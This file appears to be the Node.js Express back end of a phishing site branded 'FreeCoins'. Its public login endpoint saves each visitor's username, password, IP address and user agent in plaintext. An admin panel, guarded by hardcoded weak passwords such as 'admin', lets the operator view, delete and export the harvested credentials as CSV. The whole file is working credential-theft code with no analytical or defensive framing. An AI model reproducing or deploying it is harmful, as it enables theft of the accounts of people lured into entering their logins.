const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const { addSubmission, getAllSubmissions, deleteSubmission, clearAllSubmissions } = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

// The 3 Authorized Admin Members
const ADMIN_MEMBERS = [
    { id: 1, name: "Admin Member 1", username: "admin1", passwords: ["Grand#Admin1", "admin1", "grandadmin1"] },
    { id: 2, name: "Admin Member 2", username: "admin2", passwords: ["Grand#Admin2", "admin2", "grandadmin2"] },
    { id: 3, name: "Admin Member 3", username: "admin3", passwords: ["Grand#Admin3", "admin3", "grandadmin3"] },
    { id: 1, name: "Admin Member 1", username: "admin", passwords: ["admin", "Grand#Admin1"] }
];

// Active sessions in memory: token -> member info
const activeAdminSessions = new Map();

// Authentication Middleware (Strictly protects admin endpoints)
function requireAdminAuth(req, res, next) {
    const authHeader = req.headers['authorization'];
    const queryToken = req.query.token;
    const token = (authHeader && authHeader.startsWith('Bearer ')) 
        ? authHeader.slice(7).trim() 
        : queryToken;

    if (!token || !activeAdminSessions.has(token)) {
        return res.status(401).json({
            success: false,
            message: 'Unauthorized. Admin access is restricted to the 3 authorized members only.'
        });
    }

    req.adminMember = activeAdminSessions.get(token);
    next();
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static frontend files from current directory
app.use(express.static(__dirname));

/**
 * Endpoint: POST /api/admin/login
 * Authenticates only the 3 authorized members
 */
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            message: 'Username and password are required.'
        });
    }

    const cleanUser = username.trim().toLowerCase();
    const cleanPass = password.trim();

    const member = ADMIN_MEMBERS.find(m => 
        m.username.toLowerCase() === cleanUser && 
        m.passwords.some(p => p === cleanPass || p.toLowerCase() === cleanPass.toLowerCase())
    );

    if (!member) {
        return res.status(401).json({
            success: false,
            message: 'Invalid credentials. Access restricted to the 3 authorized members only.'
        });
    }

    // Generate secure 64-char token
    const token = crypto.randomBytes(32).toString('hex');
    activeAdminSessions.set(token, {
        id: member.id,
        name: member.name,
        username: member.username,
        loginTime: new Date().toISOString()
    });

    console.log(`[AUTH] Admin member "${member.name}" logged in successfully.`);

    return res.json({
        success: true,
        message: `Welcome, ${member.name}`,
        token,
        member: {
            id: member.id,
            name: member.name,
            username: member.username
        }
    });
});

/**
 * Endpoint: POST /api/admin/logout
 */
app.post('/api/admin/logout', (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = (authHeader && authHeader.startsWith('Bearer ')) ? authHeader.slice(7).trim() : null;
    if (token) activeAdminSessions.delete(token);
    return res.json({ success: true, message: 'Logged out successfully.' });
});

/**
 * Endpoint: GET /api/admin/verify
 */
app.get('/api/admin/verify', requireAdminAuth, (req, res) => {
    return res.json({
        success: true,
        member: req.adminMember
    });
});

/**
 * Endpoint: POST /api/login
 * Save user credentials and metadata into the SQLite database
 */
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({
                success: false,
                message: 'Username/Email and Password are required.'
            });
        }

        // Capture client details
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';

        const result = await addSubmission({
            username: username.trim(),
            password: password.trim(),
            ipAddress,
            userAgent
        });

        console.log(`[DB] Saved new entry ID #${result.id}: ${username}`);

        return res.status(201).json({
            success: true,
            message: 'Details stored successfully in database.',
            data: {
                id: result.id,
                username: result.username,
                created_at: new Date().toISOString()
            }
        });
    } catch (error) {
        console.error('Error saving submission:', error);
        return res.status(500).json({
            success: false,
            message: 'Internal server error while saving data.'
        });
    }
});

/**
 * Endpoint: GET /api/submissions
 * Fetch all stored submissions (Restricted to 3 authorized admin members)
 */
app.get('/api/submissions', requireAdminAuth, async (req, res) => {
    try {
        const rows = await getAllSubmissions();
        return res.json({
            success: true,
            count: rows.length,
            data: rows,
            requester: req.adminMember.name
        });
    } catch (error) {
        console.error('Error fetching submissions:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve database submissions.'
        });
    }
});

/**
 * Endpoint: DELETE /api/submissions/:id
 * Delete a single submission by ID (Restricted to 3 authorized admin members)
 */
app.delete('/api/submissions/:id', requireAdminAuth, async (req, res) => {
    try {
        const id = req.params.id;
        const result = await deleteSubmission(id);
        if (!result.deleted) {
            return res.status(404).json({ success: false, message: 'Submission not found.' });
        }
        return res.json({ success: true, message: `Submission #${id} deleted by ${req.adminMember.name}.` });
    } catch (error) {
        console.error('Error deleting submission:', error);
        return res.status(500).json({ success: false, message: 'Failed to delete submission.' });
    }
});

/**
 * Endpoint: DELETE /api/submissions
 * Clear all submissions (Restricted to 3 authorized admin members)
 */
app.delete('/api/submissions', requireAdminAuth, async (req, res) => {
    try {
        const result = await clearAllSubmissions();
        return res.json({
            success: true,
            message: `Cleared ${result.clearedCount} submissions by ${req.adminMember.name}.`
        });
    } catch (error) {
        console.error('Error clearing submissions:', error);
        return res.status(500).json({ success: false, message: 'Failed to clear submissions.' });
    }
});

/**
 * Endpoint: GET /api/export/csv
 * Export submissions directly as CSV download (Restricted to 3 authorized admin members)
 */
app.get('/api/export/csv', requireAdminAuth, async (req, res) => {
    try {
        const rows = await getAllSubmissions();
        
        let csv = 'ID,Username/Email,Password,IP Address,User Agent,Date/Time\r\n';
        rows.forEach(r => {
            const escapedUser = `"${(r.username || '').replace(/"/g, '""')}"`;
            const escapedPass = `"${(r.password || '').replace(/"/g, '""')}"`;
            const escapedIp = `"${(r.ip_address || '').replace(/"/g, '""')}"`;
            const escapedUa = `"${(r.user_agent || '').replace(/"/g, '""')}"`;
            const escapedDate = `"${(r.created_at || '').replace(/"/g, '""')}"`;
            csv += `${r.id},${escapedUser},${escapedPass},${escapedIp},${escapedUa},${escapedDate}\r\n`;
        });

        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename="database_submissions.csv"');
        return res.send(csv);
    } catch (error) {
        console.error('Error exporting CSV:', error);
        return res.status(500).send('Failed to export CSV');
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`=========================================`);
    console.log(`🚀 FreeCoins Server & Database is active!`);
    console.log(`🌐 Website: http://localhost:${PORT}`);
    console.log(`📊 Admin Panel: http://localhost:${PORT}/admin.html`);
    console.log(`=========================================`);
});
